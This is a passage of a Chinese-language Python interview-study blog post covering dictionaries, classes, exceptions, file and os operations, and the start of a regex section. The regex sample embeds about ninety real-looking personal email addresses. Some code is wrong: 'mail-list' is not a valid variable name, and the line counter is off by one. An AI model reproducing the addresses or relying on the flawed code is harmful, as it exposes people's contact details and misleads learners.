&#x27;y&#x27;: 2&#125;</span><br></pre></td></tr></table></figure><p><em>如何刪除特定的 Key?</em> <code>dictName.pop(KEYNAME)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(my_dict)</span><br><span class="line">&#123;&#x27;x&#x27;: 1, &#x27;y&#x27;: 2, &#x27;k&#x27;: 3&#125;</span><br><span class="line">&gt;&gt;&gt; my_dict.pop(&#x27;y&#x27;)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; print(my_dict)</span><br><span class="line">&#123;&#x27;x&#x27;: 1, &#x27;k&#x27;: 3&#125;</span><br></pre></td></tr></table></figure><p><em>如何 Merge 兩個 dictionaries</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict1.update(dict2)</span><br></pre></td></tr></table></figure><h2 id="Iterators"><a href="#Iterators" class="headerlink" title="Iterators"></a>Iterators</h2><h1 id="OOP-Class"><a href="#OOP-Class" class="headerlink" title="OOP, Class"></a>OOP, Class</h1><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p><em>What information an object in Python holds? or what attributes an object has? a. Explain each one of them</em></p><p>物件會是作用在某個資料上的 <strong>attributes</strong> 和 <strong>methods</strong> 的集合</p><ul><li>Attributes E.g. <code>self.name</code>, <code>self.age</code></li><li>Methods E.g. <code>def greet(self):</code></li><li>Class Variable: 在不同class之間共享的變數 E.g. <code>class_variable =0</code></li><li>Special Methods(Magic Methods): <code>__init__</code>, <code>__str__</code>, <code>__repr__</code></li><li>Docstring: 用來描述class或者method的字串: <code>&quot;&quot;&quot;This is a method&quot;&quot;&quot;</code></li><li>Class Name: 用於存取物件所屬類別的名稱，可以透過 <code>__class__</code> 來存取，Example <code>object.__class__.__name__</code></li><li>Module Name: 可以獲取物件所屬的class被定義在哪個 module，可以透過 <code>__module__</code> 來存取, Example <code>object.__module__</code></li><li>Dictionary 包含一個物件中所有attributes 和 methods，可用於動態存取。 Example <code>object.__dict__</code></li></ul><h2 id="Classes"><a href="#Classes" class="headerlink" title="Classes"></a>Classes</h2><h3 id="Python-Built-In-Functions"><a href="#Python-Built-In-Functions" class="headerlink" title="Python Built-In Functions"></a>Python Built-In Functions</h3><p><em>解釋一下什麼是 <code>repr</code>, <code>any</code> 和 <code>all</code> 之間的差異?</em></p><p><code>__repr__()</code> 是在Python 當中的一種特殊 method，用於在告訴其他人，物件的內容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">      self.name = name</span><br><span class="line">      self.age = age</span><br><span class="line">     </span><br><span class="line">p = Person(<span class="string">&quot;Kevin&quot;</span>, <span class="number">26</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="comment">## output: &lt;__main__.Person object at 0x102934370&gt;</span></span><br></pre></td></tr></table></figure><p>當上面的程式碼執行後會輸出物件的記憶體位址，而並不能描述物件本身，但透過 <code>repr</code> 則可以描述物件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">      self.name = name</span><br><span class="line">      self.age = age</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">     <span class="keyword">return</span> <span class="string">f&quot;Person(name=&#x27;<span class="subst">&#123;self.name&#125;</span>&#x27;, age=<span class="subst">&#123;self.age&#125;</span>)&quot;</span></span><br><span class="line">     </span><br><span class="line">p = Person(<span class="string">&quot;Kevin&quot;</span>, <span class="number">26</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="comment">## Output: Person(name=&#x27;Kevin&#x27;, age=26)</span></span><br></pre></td></tr></table></figure><p><code>any()</code> 函數如果可迭代對象中的至少一個元素為 <code>True</code>，則返回 <code>True</code>。如果可迭代對象為空或所有元素均為 <code>False</code>，則返回 <code>False</code>。</p><p><code>all()</code> 函數如果可迭代對象中的所有元素均為 <code>True</code>，則返回 <code>True</code>。如果可迭代對象為空或任何元素為 <code>False</code>，則返回 <code>False</code>。</p><h3 id="Inheritance"><a href="#Inheritance" class="headerlink" title="Inheritance"></a>Inheritance</h3><p>繼承是物件導向語言都有的特性，一個類別可以從另一個類別中繼承對應的屬性(attributes)和方法(methods)，</p><h2 id="Raises-exception"><a href="#Raises-exception" class="headerlink" title="Raises exception"></a>Raises exception</h2><ul><li><em>What is an error? What is an exception? What types of exceptions are you familiar with?</em><ul><li>錯誤可能會有的是 <strong>Syntax Error</strong> 跟 <strong>Exception</strong></li><li>Syntax Error 代表程式碼並沒有遵守 syntax rule，當 Python 的 Interpreter 在parsing 過程中檢查出，就會報錯</li><li>Exception 則是程式碼在執行期間發生的錯誤，通常是有於一些非預期狀況，像是將一個整數除以 0，或是存取一個空的檔案，就可能出現錯誤<ul><li>但 Exception 可以透過 <code>try</code> 跟 <code>except</code> 來去發現跟處理</li></ul></li><li>常見的 Exception <ul><li>ZeroDivisionError</li><li>ValueError</li><li>TypeError</li><li>IndexError </li><li>KeyError</li><li>FileNotFoundError</li><li>ArrtibuteError</li><li>ImportError</li></ul></li></ul></li></ul><p><em>Example</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = <span class="number">10</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cannot divide zero&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result:<span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Completely&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cannot divide zero</span><br><span class="line">Completely</span><br></pre></td></tr></table></figure><h1 id="Async-amp-amp-Concurrency"><a href="#Async-amp-amp-Concurrency" class="headerlink" title="Async &amp;&amp; Concurrency"></a>Async &amp;&amp; Concurrency</h1><blockquote><p>同步跟非同步的概念可以參考 <a href="https://jimmy-huang.medium.com/python-asyncio-%E5%8D%94%E7%A8%8B-d84b5b945b5b">這篇文章</a></p></blockquote><h1 id="Files-Manipulation"><a href="#Files-Manipulation" class="headerlink" title="Files Manipulation"></a>Files Manipulation</h1><p><em>如何寫入檔案?</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>,  <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&quot;This is a test file.&quot;</span>)</span><br></pre></td></tr></table></figure><p><em>給定文字檔，每三行就印出來</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_3rd_line</span>(<span class="params">file_path</span>) -&gt;<span class="built_in">str</span>:</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(file):</span><br><span class="line">            <span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(line)</span><br><span class="line">                result.append(line)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join(result) </span><br></pre></td></tr></table></figure><p><em>給定文字檔，印出該檔案有幾行</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_line</span>(<span class="params">file_path</span>) -&gt;<span class="built_in">str</span>:</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(file):</span><br><span class="line">            result = i</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p><em>給定文字檔，印出該檔案有幾個字彙(word)</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_word</span>(<span class="params">file_path</span>) -&gt;<span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        text =file.read()</span><br><span class="line">        words = text.split()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(words)</span><br></pre></td></tr></table></figure><p><em>將一段文字寫入到已開啟的檔案最末端</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;A brown fox jumped over the lazy dog.&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;example.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&#x27;\n&#x27;</span> +text + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><em>如何將 dictionary 寫入一個檔案</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_dict</span>(<span class="params">file_path</span>) -&gt;<span class="built_in">str</span>:</span><br><span class="line">    myDict = <span class="built_in">dict</span>(x=<span class="number">1</span>, y=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(json.dumps(myDict))</span><br></pre></td></tr></table></figure><p><em>讀取 json檔案</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;example.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = json.load(file)</span><br><span class="line">    pprint(data)</span><br></pre></td></tr></table></figure><p><em>寫入 json 檔案</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;user&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;id&quot;: 12345,</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;Alice Johnson&quot;,</span></span><br><span class="line"><span class="string">      &quot;email&quot;: &quot;alice.johnson@example.com&quot;,</span></span><br><span class="line"><span class="string">      &quot;isActive&quot;: true,</span></span><br><span class="line"><span class="string">      &quot;age&quot;: 29,</span></span><br><span class="line"><span class="string">      &quot;address&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;street&quot;: &quot;123 Main St&quot;,</span></span><br><span class="line"><span class="string">        &quot;city&quot;: &quot;Wonderland&quot;,</span></span><br><span class="line"><span class="string">        &quot;postalCode&quot;: &quot;12345&quot;,</span></span><br><span class="line"><span class="string">        &quot;country&quot;: &quot;Fantasyland&quot;</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">      &quot;preferences&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;notifications&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;email&quot;: true,</span></span><br><span class="line"><span class="string">          &quot;sms&quot;: false</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        &quot;theme&quot;: &quot;dark&quot;</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">      ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># Convert to dictionary</span></span><br><span class="line">data = json.loads(<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;example.json&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">   json.dump(data, file)</span><br><span class="line"></span><br><span class="line">pprint(data)</span><br></pre></td></tr></table></figure><h2 id="使用-Pathlib"><a href="#使用-Pathlib" class="headerlink" title="使用 Pathlib"></a>使用 Pathlib</h2><p><em>印出當前目錄下的檔案內容</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = pathlib.Path(os.getcwd()+<span class="string">&#x27;/example.txt&#x27;</span>)</span><br><span class="line">text = path.read_text()</span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure><p><em>寫入字串到檔案</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;A quick brown fox jumped over the dog.&quot;</span></span><br><span class="line">path = pathlib.Path(os.getcwd() + <span class="string">&#x27;/example.txt&#x27;</span>)</span><br><span class="line">path.write_text(text)</span><br><span class="line">story = path.read_text()</span><br><span class="line"><span class="built_in">print</span>(story)</span><br></pre></td></tr></table></figure><h1 id="OS-operations"><a href="#OS-operations" class="headerlink" title="OS operations"></a>OS operations</h1><p>python 中的 <code>os</code> 模組提供了許多low level 的作業系統 system call，並且在多種作業系統中提供一個統一的調用介面。</p><p><em>os module 提供的methods</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">os.listdir(<span class="string">&#x27;DIRECTORY PATH&#x27;</span>)</span><br><span class="line">os.rename(<span class="string">&#x27;Bpple&#x27;</span>,<span class="string">&#x27;Apple&#x27;</span>)</span><br><span class="line">os.chmod(<span class="string">&#x27;script.py&#x27;</span>, <span class="number">0o777</span>)</span><br><span class="line">os.mkdir(<span class="string">&#x27;/tmp/devops&#x27;</span>)</span><br><span class="line">os.remove(<span class="string">&#x27;script.py&#x27;</span>)</span><br><span class="line">os.rmdir(<span class="string">&#x27;/tmp/devops&#x27;</span>)</span><br><span class="line">os.stat(<span class="string">&#x27;/tmp/devops&#x27;</span>) <span class="comment"># 取得檔案或目錄資訊，像是檔案權限、存取時間..etc</span></span><br></pre></td></tr></table></figure><p><em>如何印出當前目錄</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.getcwd())</span><br></pre></td></tr></table></figure><p><em>給定檔案路徑 <code>/dir1/dir2/file1</code>，印出檔案名稱</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(os.path.basename(<span class="string">&#x27;/dir1/dir2/file1&#x27;</span>))</span><br></pre></td></tr></table></figure><p><em>如何透過 Python 執行 Shell 命令?</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;ls -l&quot;</span>)</span><br></pre></td></tr></table></figure><p><em>如何將不同路徑串接在一起</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(os.path.join(Dir_Path1, Dir_Path2))</span><br></pre></td></tr></table></figure><h2 id="使用-os-walk-遍歷資料夾"><a href="#使用-os-walk-遍歷資料夾" class="headerlink" title="使用 os.walk 遍歷資料夾"></a>使用 os.walk 遍歷資料夾</h2><p><code>os</code> 模組提供了一個好用的 method 叫做 <code>os.walk</code> 用來 traverse 整個檔案樹。這個函數每次都會回傳一個 generator，可以在每次迭代過程中傳回一個 tuple，該tuple 包含當前的目錄、目錄列表和檔案列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">walk_dir</span>(<span class="params">parent_path</span>):</span><br><span class="line">    <span class="keyword">for</span> parent_path, <span class="built_in">dir</span>, files <span class="keyword">in</span> os.walk(parent_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Checking: <span class="subst">&#123;parent_path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> fileName <span class="keyword">in</span> files:</span><br><span class="line">            file_Path = os.path.join(parent_path, fileName)</span><br><span class="line">            last_access = os.path.getatime(file_Path)</span><br><span class="line">            size = os.path.getsize(file_Path)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;File: <span class="subst">&#123;file_Path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Last accessed: <span class="subst">&#123;last_access&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Size: <span class="subst">&#123;size&#125;</span> bytes&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="正則表達式"><a href="#正則表達式" class="headerlink" title="正則表達式"></a>正則表達式</h1><p>Python 提供 <code>re</code> 模組可以進行正則表達式操作</p><p>假設有個字串集合是 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">mail-<span class="built_in">list</span> =  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">kevin@amazon.com,</span></span><br><span class="line"><span class="string">kev.mgry@jabber.ru</span></span><br><span class="line"><span class="string">kev.mgry@jabber.rualkhobar_boy@ayna.com</span></span><br><span class="line"><span class="string">rami_moman@hotmail.com</span></span><br><span class="line"><span class="string">hazeen@cam.com</span></span><br><span class="line"><span class="string">waleed_97@hotmail.com</span></span><br><span class="line"><span class="string">al_aned@hotmail.com</span></span><br><span class="line"><span class="string">wldabooh@hotmail.com</span></span><br><span class="line"><span class="string">b_m_attar@yahoo.com</span></span><br><span class="line"><span class="string">mohscript@hotmail.com</span></span><br><span class="line"><span class="string">malarifi@usa.com</span></span><br><span class="line"><span class="string">salehsul@yahoo.com</span></span><br><span class="line"><span class="string">aljwhra@hotmail.com</span></span><br><span class="line"><span class="string">ethaer@hotmail.com</span></span><br><span class="line"><span class="string">ben_njem@hotmail.com</span></span><br><span class="line"><span class="string">maas2000@maktoob.com</span></span><br><span class="line"><span class="string">aboa7med@yahoo.com</span></span><br><span class="line"><span class="string">saud124@hotmail.com</span></span><br><span class="line"><span class="string">hm_2002_ad@hotmail.com</span></span><br><span class="line"><span class="string">hm2002ad@maktoob.com</span></span><br><span class="line"><span class="string">dark_eyess@hotmail.com</span></span><br><span class="line"><span class="string">wali999@hotmail.com</span></span><br><span class="line"><span class="string">mateb_2001@ayna.com</span></span><br><span class="line"><span class="string">devil2100@maktoob.com</span></span><br><span class="line"><span class="string">ahmedshatoor@hotmail.com</span></span><br><span class="line"><span class="string">faisal20o0@hotmail.com</span></span><br><span class="line"><span class="string">m_sh4ever@hotmail.com</span></span><br><span class="line"><span class="string">shaib2005@maktoob.com</span></span><br><span class="line"><span class="string">f-tp@maktoob.com</span></span><br><span class="line"><span class="string">kevin@amazon.com</span></span><br><span class="line"><span class="string">smartstar_sa@yahoo.com</span></span><br><span class="line"><span class="string">swaah99@hotmail.com</span></span><br><span class="line"><span class="string">do7me2002@hotmail.com</span></span><br><span class="line"><span class="string">bleaks20@hotmail.com</span></span><br><span class="line"><span class="string">zaeem@ksatoday.com</span></span><br><span class="line"><span class="string">sarah_21_ksa@hotmail.com</span></span><br><span class="line"><span class="string">raheema@ayna.com</span></span><br><span class="line"><span class="string">toyota@444.net</span></span><br><span class="line"><span class="string">majeed97@hotmail.com</span></span><br><span class="line"><span class="string">khabom2@hotmail.com</span></span><br><span class="line"><span class="string">a2685@yahoo.com</span></span><br><span class="line"><span class="string">ab_alraddadi@yahoo.com</span></span><br><span class="line"><span class="string">turky_net2002@hotmail.com</span></span><br><span class="line"><span class="string">abu_fahad22@hotmail.com</span></span><br><span class="line"><span class="string">yah1418@maktoob.com</span></span><br><span class="line"><span class="string">new_sa1@yahoo.com</span></span><br><span class="line"><span class="string">anoooooooos@hotmail.com</span></span><br><span class="line"><span class="string">fem_kinani@hotmail.com</span></span><br><span class="line"><span class="string">albqaawi@ayna.com</span></span><br><span class="line"><span class="string">alhazenh@hotmail.com</span></span><br><span class="line"><span class="string">uea1@hotmail.com</span></span><br><span class="line"><span class="string">azoo1ooz@hotmail.com</span></span><br><span class="line"><span class="string">00@factmail.ca</span></span><br><span class="line"><span class="string">love-1@maktoob.com</span></span><br><span class="line"><span class="string">rami_shut@yahoo.com</span></span><br><span class="line"><span class="string">the_husaam@hotmail.com</span></span><br><span class="line"><span class="string">vip9999@ayna.com</span></span><br><span class="line"><span class="string">noor_99_99@yahoo.com</span></span><br><span class="line"><span class="string">alma7roomm@hotmail.com</span></span><br><span class="line"><span class="string">jawad76ly@yahoo.com</span></span><br><span class="line"><span class="string">hemdan_na@hotmail.com</span></span><br><span class="line"><span class="string">i@stc.com</span></span><br><span class="line"><span class="string">buok6977@ayna.come</span></span><br><span class="line"><span class="string">hwaawy@yahoo.com</span></span><br><span class="line"><span class="string">aseer2@maktoob.com</span></span><br><span class="line"><span class="string">bin_000@hotmail.com</span></span><br><span class="line"><span class="string">abeyr@ayna.com</span></span><br><span class="line"><span class="string">al_maknun2001@maktoob.com</span></span><br><span class="line"><span class="string">ahmsh@naseej.com</span></span><br><span class="line"><span class="string">far_alsekak@hotmail.com</span></span><br><span class="line"><span class="string">mos011@yahoo.com</span></span><br><span class="line"><span class="string">saud1900@hotmail.com</span></span><br><span class="line"><span class="string">essa1420@yahoo.com</span></span><br><span class="line"><span class="string">almonta7er@hotmail.com</span></span><br><span class="line"><span class="string">zayd2002-2000@maktoob.com</span></span><br><span class="line"><span class="string">kh_mahfouz@hotmail.com</span></span><br><span class="line"><span class="string">l3yonha@hotmail.com</span></span><br><span class="line"><span class="string">hat1972@hotmail.com</span></span><br><span class="line"><span class="string">mk8n@hotmail.com</span></span><br><span class="line"><span class="string">soul_devil14@hotmail.com</span></span><br><span class="line"><span class="string">khater_love@hotmail.com</span></span><br><span class="line"><span class="string">mohdbahrawi@hotmail.com</span></span><br><span class="line"><span class="string">naaader@hotmail.com</span></span><br><span class="line"><span class="string">faisal_war@yahoo.com</span></span><br><span class="line"><span class="string">arramalomari@hotmail.com</span></span><br><span class="line"><span class="string">gmmare@hotmail.com</span></span><br><span class="line"><span class="string">thamir5@hotmail.com</span></span><br><span class="line"><span class="string">seilver@hotmail.com</span></span><br><span class="line"><span class="string">aboghadi@hotmail.com</span></span><br><span class="line"><span class="string">latte2001@maktoob.com</span></span><br><span class="line"><span class="string">lotfy_s@hotmail.com</span></span><br><span class="line"><span class="string">hamadah990@hotmail.com</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>今天想要查找 <code>kevin@amazon.com</code> 但假設你只知道你要找的人的信箱開頭是 